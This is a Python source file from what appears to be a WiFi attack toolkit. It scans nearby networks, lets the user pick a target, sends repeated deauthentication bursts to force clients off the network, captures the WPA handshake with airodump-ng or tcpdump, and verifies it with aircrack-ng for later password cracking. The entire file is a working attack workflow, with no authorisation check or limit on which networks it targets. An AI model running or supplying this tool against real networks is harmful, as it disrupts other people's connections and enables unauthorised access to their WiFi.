#!/usr/bin/env python3
"""
WiFi Handshake Capture
======================

Orchestrates the complete handshake capture workflow:
1. Scan for networks
2. Select target
3. Send deauth packets
4. Capture handshake
5. Verify handshake
"""

import subprocess
import time
import os
import signal
from typing import Optional, Tuple, List
from dataclasses import dataclass
from pathlib import Path

from .network_scanner import NetworkScanner, WiFiNetwork
from .deauth_attack import DeauthAttacker


@dataclass
class CaptureResult:
    """Result of handshake capture"""
    success: bool
    pcap_file: Optional[str]
    target_network: Optional[WiFiNetwork]
    handshakes_captured: int
    duration: float
    message: str


class HandshakeCapture:
    """WiFi handshake capture orchestrator"""

    def __init__(self, interface: str, output_dir: str = "./captures"):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.scanner = NetworkScanner(interface)
        self.deauther = DeauthAttacker(interface)

        self.capture_process = None

    def scan_and_select_network(
        self,
        scan_duration: int = 10,
        show_hidden: bool = False,
        min_power: int = -80
    ) -> Optional[WiFiNetwork]:
        """
        Scan for networks and let user select target

        Args:
            scan_duration: How long to scan in seconds
            show_hidden: Show hidden networks
            min_power: Minimum signal strength to display

        Returns:
            Selected network or None if cancelled
        """
        # Scan for networks
        networks = self.scanner.scan(duration=scan_duration)

        if not networks:
            print("[-] No networks found")
            return None

        # Filter networks
        filtered_networks = [
            net for net in networks
            if (show_hidden or net.essid and not net.essid.startswith('Hidden-'))
            and net.power >= min_power
        ]

        if not filtered_networks:
            print("[-] No networks match filters")
            return None

        # Sort by signal strength
        filtered_networks.sort(key=lambda x: x.power, reverse=True)

        # Display networks
        print("\n" + "="*90)
        print("  #  | ESSID                     | BSSID             | CH | PWR   | ENC      | CLNT")
        print("="*90)

        for i, net in enumerate(filtered_networks, 1):
            client_marker = "✓" if net.has_clients else " "
            print(f" {i:2d}  | {net.essid:25s} | {net.bssid} | {net.channel:2d} | "
                  f"{net.power:3d} dBm | {net.encryption:8s} | {len(net.clients):2d} {client_marker}")

        print("="*90)

        # Let user select
        while True:
            try:
                choice = input("\nSelect network (1-{}, 0 to cancel): ".format(len(filtered_networks)))

                if choice == '0':
                    return None

                idx = int(choice) - 1
                if 0 <= idx < len(filtered_networks):
                    selected = filtered_networks[idx]
                    print(f"\n[+] Selected: {selected.essid} ({selected.bssid})")
                    return selected
                else:
                    print(f"[-] Invalid choice, enter 1-{len(filtered_networks)}")

            except (ValueError, KeyboardInterrupt):
                print("\n[!] Cancelled")
                return None

    def capture_handshake(
        self,
        target: WiFiNetwork,
        output_file: Optional[str] = None,
        deauth_count: int = 10,
        capture_duration: int = 30,
        verify: bool = True
    ) -> CaptureResult:
        """
        Capture handshake from target network

        Args:
            target: Target network
            output_file: Output PCAP file (auto-generated if None)
            deauth_count: Number of deauth packets per burst
            capture_duration: Maximum capture duration in seconds
            verify: Verify handshake after capture

        Returns:
            CaptureResult with capture status
        """
        start_time = time.time()

        # Generate output filename if not provided
        if not output_file:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            safe_essid = "".join(c for c in target.essid if c.isalnum() or c in (' ', '-', '_')).strip()
            output_file = self.output_dir / f"{safe_essid}_{timestamp}"
        else:
            output_file = Path(output_file)

        print(f"\n[*] Starting handshake capture")
        print(f"[*] Target: {target.essid} ({target.bssid})")
        print(f"[*] Channel: {target.channel}")
        print(f"[*] Encryption: {target.encryption}")
        print(f"[*] Output: {output_file}.cap")
        
        # Check if network is open (no encryption)
        if target.encryption.upper() in ('OPN', 'OPEN', 'NONE', ''):
            print("[!] Warning: Target network appears to be open (no encryption)")
            print("[!] Open networks don't have WPA/WPA2 handshakes to capture")
            print("[!] Continuing capture anyway to collect traffic...")

        # Start capture
        capture_success = self._start_capture(str(output_file), target.channel)

        if not capture_success:
            return CaptureResult(
                success=False,
                pcap_file=None,
                target_network=target,
                handshakes_captured=0,
                duration=time.time() - start_time,
                message="Failed to start packet capture"
            )

        # Wait a bit for capture to initialize
        time.sleep(2)

        # Send deauth packets repeatedly during capture
        print(f"\n[*] Sending deauth packets every 5 seconds to force reconnections...")
        print(f"[*] Waiting for handshake... ({capture_duration}s)")

        deauth_interval = 5  # Send deauth every 5 seconds
        last_deauth_time = 0

        for i in range(capture_duration):
            time.sleep(1)
            remaining = capture_duration - i - 1
            elapsed = i + 1

            # Send deauth packets periodically to force reconnections
            if elapsed - last_deauth_time >= deauth_interval:
                if target.clients:
                    # Target specific clients
                    for client in target.clients[:3]:  # Limit to first 3 clients
                        result = self.deauther.deauth_network(target.bssid, client, count=deauth_count)
                        if result.success:
                            print(f"\r[*] Deauth sent to {client} - {remaining}s remaining", end='', flush=True)
                        time.sleep(0.3)
                else:
                    # Broadcast deauth to all clients
                    result = self.deauther.deauth_network(target.bssid, None, count=deauth_count)
                    if result.success:
                        print(f"\r[*] Broadcast deauth sent - {remaining}s remaining", end='', flush=True)
                
                last_deauth_time = elapsed

            # Check if we have handshake (every 5 seconds)
            if i > 0 and i % 5 == 0 and verify:
                if self._quick_check_handshake(f"{output_file}.cap", target.bssid):
                    print(f"\n[+] Handshake captured! (after {elapsed}s)")
                    break

            print(f"\r[*] Capturing... {remaining}s remaining", end='', flush=True)

        print()

        # Stop capture
        self._stop_capture()

        # Verify handshake
        if verify:
            print("\n[*] Verifying handshake...")
            handshake_count = self._verify_handshake(f"{output_file}.cap", target.bssid)

            if handshake_count > 0:
                print(f"[+] Success! Captured {handshake_count} handshake(s)")
                print(f"[+] Saved to: {output_file}.cap")

                return CaptureResult(
                    success=True,
                    pcap_file=f"{output_file}.cap",
                    target_network=target,
                    handshakes_captured=handshake_count,
                    duration=time.time() - start_time,
                    message=f"Successfully captured {handshake_count} handshake(s)"
                )
            else:
                print("[-] No handshake captured")
                print("[!] Possible reasons:")
                print("    - No clients connected to network")
                print("    - Clients didn't reconnect during capture")
                print("    - Weak signal strength")
                print("\n[*] PCAP file saved anyway for manual inspection")

                return CaptureResult(
                    success=False,
                    pcap_file=f"{output_file}.cap",
                    target_network=target,
                    handshakes_captured=0,
                    duration=time.time() - start_time,
                    message="No handshake captured, but PCAP file saved"
                )
        else:
            return CaptureResult(
                success=True,
                pcap_file=f"{output_file}.cap",
                target_network=target,
                handshakes_captured=-1,  # Unknown
                duration=time.time() - start_time,
                message="Capture complete (verification skipped)"
            )

    def _start_capture(self, output_prefix: str, channel: int) -> bool:
        """Start packet capture with airodump-ng"""

        # Try airodump-ng
        if self._command_exists('airodump-ng'):
            return self._capture_with_airodump(output_prefix, channel)

        # Fallback to tcpdump
        if self._command_exists('tcpdump'):
            return self._capture_with_tcpdump(output_prefix)

        return False

    def _command_exists(self, command: str) -> bool:
        """Check if command exists"""
        try:
            subprocess.run(['which', command], capture_output=True, check=True)
            return True
        except:
            return False

    def _capture_with_airodump(self, output_prefix: str, channel: int) -> bool:
        """Capture with airodump-ng"""
        try:
            self.capture_process = subprocess.Popen(
                [
                    'airodump-ng',
                    '-c', str(channel),
                    '-w', output_prefix,
                    '--output-format', 'pcap',
                    self.interface
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )

            return True

        except Exception as e:
            print(f"[-] Error starting airodump-ng: {e}")
            return False

    def _capture_with_tcpdump(self, output_prefix: str) -> bool:
        """Capture with tcpdump (fallback)"""
        try:
            self.capture_process = subprocess.Popen(
                [
                    'tcpdump',
                    '-i', self.interface,
                    '-w', f"{output_prefix}.cap",
                    'type mgt subtype beacon or type mgt subtype probe-req or type mgt subtype probe-resp or type data'
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )

            return True

        except Exception as e:
            print(f"[-] Error starting tcpdump: {e}")
            return False

    def _stop_capture(self):
        """Stop packet capture"""
        if self.capture_process:
            try:
                os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
                self.capture_process.wait(timeout=2)
            except:
                pass

            self.capture_process = None

    def _quick_check_handshake(self, pcap_file: str, bssid: str) -> bool:
        """Quick check if handshake is present"""
        if not os.path.exists(pcap_file):
            # Try with -01 suffix (airodump-ng format)
            pcap_file_alt = pcap_file.replace('.cap', '-01.cap')
            if not os.path.exists(pcap_file_alt):
                return False
            pcap_file = pcap_file_alt

        try:
            # Use aircrack-ng to quickly check
            result = subprocess.run(
                ['aircrack-ng', pcap_file],
                capture_output=True,
                text=True,
                timeout=5
            )

            # Look for handshake indicator - be more specific
            output = result.stdout.lower()
            # Must have "1 handshake" or "handshake" AND not "0 handshake"
            has_handshake = ('1 handshake' in result.stdout or 
                           ('handshake' in output and '0 handshake' not in output))
            
            # Also check for WPA handshake specifically
            if has_handshake and 'wpa' in output:
                return True
            
            return False

        except:
            return False

    def _verify_handshake(self, pcap_file: str, bssid: str) -> int:
        """
        Verify handshake in PCAP file

        Returns:
            Number of handshakes found
        """
        if not os.path.exists(pcap_file):
            # Try with -01 suffix (airodump-ng format)
            pcap_file_alt = pcap_file.replace('.cap', '-01.cap')
            if os.path.exists(pcap_file_alt):
                pcap_file = pcap_file_alt
                # Rename to remove -01 suffix
                import shutil
                try:
                    shutil.move(pcap_file_alt, pcap_file_alt.replace('-01.cap', '.cap'))
                    pcap_file = pcap_file_alt.replace('-01.cap', '.cap')
                except:
                    pass
            else:
                return 0

        try:
            # Use aircrack-ng to verify
            result = subprocess.run(
                ['aircrack-ng', pcap_file],
                capture_output=True,
                text=True,
                timeout=10
            )

            # Parse output for handshake count
            import re
            match = re.search(r'(\d+) handshake', result.stdout)
            if match:
                return int(match.group(1))

            # Alternative: look for "WPA handshake"
            if 'handshake' in result.stdout.lower():
                return 1

            return 0

        except Exception as e:
            print(f"[!] Verification error: {e}")
            return 0
